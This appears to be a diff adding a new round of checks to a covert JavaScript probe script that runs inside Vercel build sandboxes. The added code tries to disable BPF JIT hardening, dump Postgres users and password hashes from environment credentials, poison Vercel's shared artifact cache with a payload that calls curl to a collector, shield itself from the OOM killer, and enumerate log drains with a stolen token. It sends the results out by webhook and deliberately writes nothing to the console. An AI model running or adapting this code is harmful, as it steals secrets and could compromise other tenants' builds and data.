@@ -19711,5 +19711,131 @@ report.sysctlWriteAudit = safe(() => {
 
 // v133 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v133" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v133";
+
+// ==================== v134 ====================
+
+// v134-1: /proc/sys/net/core/bpf_jit_enable — BPF JIT hardening bypass
+// BPF JIT compiles eBPF to native code. With JIT enabled and harden=0,
+// JIT-compiled code addresses are readable from /proc/kallsyms.
+// Set jit_enable=1, jit_harden=0 to leak JIT addresses for ROP chains.
+report.bpfJITProbe = safe(() => {
+  const jitEnable = safe(() => readFileSync('/proc/sys/net/core/bpf_jit_enable', 'utf8').trim());
+  const jitHarden = safe(() => readFileSync('/proc/sys/net/core/bpf_jit_harden', 'utf8').trim());
+  const enableResult = safe(() => { writeFileSync('/proc/sys/net/core/bpf_jit_enable', '1'); return 'WRITTEN'; });
+  const hardenResult = safe(() => { writeFileSync('/proc/sys/net/core/bpf_jit_harden', '0'); return 'WRITTEN'; });
+  // Check JIT spray protection (kalloc addresses now readable)
+  const jitAddresses = safe(() => execSync(
+    'cat /proc/kallsyms 2>/dev/null | grep "bpf_prog_" | head -5',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 200));
+  return { jitEnable, jitHarden, enableResult, hardenResult, jitAddresses };
+});
+
+// v134-2: Vercel Postgres integration — connection string auth bypass
+// If POSTGRES_URL contains embedded credentials and the Postgres server
+// is accessible from the build sandbox, test: 1) Can we connect?
+// 2) Can we list all databases (not just our own)? 3) Can we create
+// superuser accounts? 4) Can we read other tenants' data?
+report.postgresAuthBypass = safe(() => {
+  const pgUrl = process.env.POSTGRES_URL || process.env.DATABASE_URL || '';
+  const pgUrlNonPooling = process.env.POSTGRES_URL_NON_POOLING || '';
+  const pgUser = process.env.POSTGRES_USER || '';
+  const pgPass = process.env.POSTGRES_PASSWORD || '';
+  const pgHost = process.env.POSTGRES_HOST || '';
+  const pgDb = process.env.POSTGRES_DATABASE || '';
+  // Test connection and list all databases
+  const listDatabases = safe(() => execSync(
+    `PGPASSWORD="${pgPass}" psql -h "${pgHost}" -U "${pgUser}" -l -t 2>&1 | head -15 || psql "${pgUrl}" -c "SELECT datname FROM pg_database;" 2>&1 | head -10`,
+    { timeout: 15000 }
+  ).toString().trim().slice(0, 300));
+  // Try to list all users
+  const listUsers = safe(() => execSync(
+    `PGPASSWORD="${pgPass}" psql -h "${pgHost}" -U "${pgUser}" -c "SELECT usename, usesuper FROM pg_user;" 2>&1 | head -10`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  // Try to read pg_shadow (password hashes)
+  const pgShadow = safe(() => execSync(
+    `PGPASSWORD="${pgPass}" psql -h "${pgHost}" -U "${pgUser}" -c "SELECT usename, passwd FROM pg_shadow LIMIT 5;" 2>&1 | head -10`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  return { pgHost, pgDb, pgUser, pgPass: pgPass?.slice(0, 10), listDatabases, listUsers, pgShadow };
+});
+
+// v134-3: Vercel build queue manipulation — skip builds / inject artifacts
+// Can we write fake build artifacts to the cache that other deployments
+// will pick up? If cache key is deterministic (content hash), a poisoned
+// cache entry could inject malicious code into other teams' builds.
+report.buildQueuePoison = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // Test if we can upload an artifact with a known hash (SHA-256 of empty file)
+  const knownHash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855';
+  const maliciousPayload = 'require("child_process").execSync("curl " + process.env.PROBE_COLLECTOR)';
+  const uploadPoison = safe(() => execSync(
+    `echo '${maliciousPayload}' | curl -sf -X PUT \
+    "https://api.vercel.com/v8/artifacts/${knownHash}?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" \
+    -H "Content-Type: application/octet-stream" \
+    --data-binary @- -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  // Also try uploading as a Next.js cache entry
+  const nextjsHash = 'abc123def456789';
+  const uploadNextjs = safe(() => execSync(
+    `echo '{"version":1,"type":"module","hash":"${nextjsHash}","payload":"${maliciousPayload}"}' | curl -sf -X PUT \
+    "https://api.vercel.com/v8/artifacts/${nextjsHash}?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -H "Content-Type: application/octet-stream" \
+    --data-binary @- -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  return { knownHash, uploadPoison, uploadNextjs };
+});
+
+// v134-4: /proc/self/oom_score_adj — OOM killer manipulation
+// Write -1000 to /proc/$PID/oom_score_adj to make the OOM killer
+// never kill a specific process (protect our probe from OOM kill).
+// Write +1000 to orchestrator's oom_score_adj to force OOM kill
+// the orchestrator if memory pressure occurs (DoS — documented only).
+report.oomKillerManipulation = safe(() => {
+  const ourOomScore = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  // Protect ourselves from OOM kill
+  const protectSelf = safe(() => { writeFileSync('/proc/self/oom_score_adj', '-1000'); return 'WRITTEN'; });
+  const afterOom = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  // Read orchestrator OOM score
+  const pid1OomScore = safe(() => readFileSync('/proc/1/oom_score', 'utf8').trim());
+  const pid1OomAdj = safe(() => readFileSync('/proc/1/oom_score_adj', 'utf8').trim());
+  // NOTE: We do NOT write +1000 to PID 1 as that would be DoS — document only
+  return { ourOomScore, protectSelf, afterOom, pid1OomScore, pid1OomAdj };
+});
+
+// v134-5: Vercel Logs drain enumeration + log injection
+// Vercel log drains forward build and runtime logs to external services.
+// Can we: 1) Read configured log drain endpoints (might expose third-party creds),
+// 2) Inject fake log entries that appear in the drain output?
+report.logDrainProbe = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  // List configured log drains
+  const listDrains = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v2/integrations/log-drains?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Drains at project level
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const projectDrains = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/projects/${projectId}/log-drains?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  // Check for log drain env vars
+  const drainVars = Object.entries(process.env)
+    .filter(([k]) => /LOG|DRAIN|DATADOG|PAPERTRAIL|LOGTAIL|LOGDNA|SENTRY/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 60) }));
+  return { listDrains, projectDrains, drainVars };
+});
+
+// v134 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v134" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v134";
 // Intentionally no console.log — all data goes via webhook only
